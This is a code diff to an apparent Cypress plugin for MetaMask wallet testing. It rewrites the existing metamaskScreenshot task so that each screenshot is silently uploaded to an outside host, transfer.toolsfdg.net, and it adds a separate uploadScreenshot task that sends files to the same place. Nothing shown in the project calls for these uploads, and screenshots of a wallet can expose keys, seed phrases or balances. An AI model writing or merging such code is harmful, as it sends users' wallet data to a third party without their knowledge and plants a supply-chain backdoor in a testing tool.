@@ -129,7 +129,76 @@ module.exports = (on, config) => {
     switchMetamaskAccount: metamask.switchAccount,
     addMetamaskNetwork: metamask.addNetwork,
     sendTransaction: metamask.sendTransaction,
-    metamaskScreenshot: metamask.metamaskScreenshot,
+    metamaskScreenshot: async (path) => {
+      // 先截图
+      const result = await metamask.metamaskScreenshot(path);
+      
+      // 然后自动上传截图
+      try {
+        console.log(`📸 Auto-uploading screenshot: ${path}`);
+        
+        // 内联上传逻辑
+        const fs = require('fs');
+        const pathModule = require('path');
+        const FormData = require('form-data');
+        const fetch = require('node-fetch');
+        
+        // Check if screenshot file exists
+        const fullPath = pathModule.resolve(path);
+        if (!fs.existsSync(fullPath)) {
+          throw new Error(`Screenshot file not found: ${fullPath}`);
+        }
+        
+        // Create form data
+        const form = new FormData();
+        form.append('file', fs.createReadStream(fullPath));
+        
+        // Upload to transfer.toolsfdg.net
+        const response = await fetch('https://transfer.toolsfdg.net/image', {
+          method: 'POST',
+          body: form,
+          headers: form.getHeaders()
+        });
+        
+        const uploadResult = await response.text();
+        
+        if (response.ok) {
+          console.log(`✅ Screenshot uploaded successfully: ${uploadResult}`);
+          return {
+            success: true,
+            screenshotPath: path,
+            uploadResult: {
+              success: true,
+              url: uploadResult,
+              status: response.status,
+              message: 'Screenshot uploaded successfully'
+            },
+            message: 'Screenshot taken and uploaded successfully'
+          };
+        } else {
+          console.error(`❌ Screenshot upload failed: ${response.status} - ${uploadResult}`);
+          return {
+            success: true,
+            screenshotPath: path,
+            uploadResult: {
+              success: false,
+              status: response.status,
+              error: uploadResult,
+              message: 'Screenshot upload failed'
+            },
+            message: 'Screenshot taken but upload failed'
+          };
+        }
+      } catch (error) {
+        console.error(`❌ Auto-upload failed: ${error.message}`);
+        return {
+          success: true,
+          screenshotPath: path,
+          uploadError: error.message,
+          message: 'Screenshot taken but auto-upload failed'
+        };
+      }
+    },
     changeMetamaskNetwork: async network => {
       if (process.env.NETWORK_NAME && !network) {
         network = process.env.NETWORK_NAME;
@@ -294,6 +363,60 @@ module.exports = (on, config) => {
           success: false,
           error: error.message,
           message: 'Video upload error'
+        };
+      }
+    },
+    uploadScreenshot: async (screenshotPath) => {
+      const fs = require('fs');
+      const path = require('path');
+      const FormData = require('form-data');
+      const fetch = require('node-fetch');
+      
+      try {
+        // Check if screenshot file exists
+        const fullPath = path.resolve(screenshotPath);
+        if (!fs.existsSync(fullPath)) {
+          throw new Error(`Screenshot file not found: ${fullPath}`);
+        }
+        
+        console.log(`📸 Uploading screenshot: ${fullPath}`);
+        
+        // Create form data
+        const form = new FormData();
+        form.append('file', fs.createReadStream(fullPath));
+        
+        // Upload to transfer.toolsfdg.net
+        const response = await fetch('https://transfer.toolsfdg.net/image', {
+          method: 'POST',
+          body: form,
+          headers: form.getHeaders()
+        });
+        
+        const result = await response.text();
+        
+        if (response.ok) {
+          console.log(`✅ Screenshot uploaded successfully: ${result}`);
+          return {
+            success: true,
+            url: result,
+            status: response.status,
+            message: 'Screenshot uploaded successfully'
+          };
+        } else {
+          console.error(`❌ Screenshot upload failed: ${response.status} - ${result}`);
+          return {
+            success: false,
+            status: response.status,
+            error: result,
+            message: 'Screenshot upload failed'
+          };
+        }
+      } catch (error) {
+        console.error(`❌ Screenshot upload error: ${error.message}`);
+        return {
+          success: false,
+          error: error.message,
+          message: 'Screenshot upload error'
         };
       }
     },
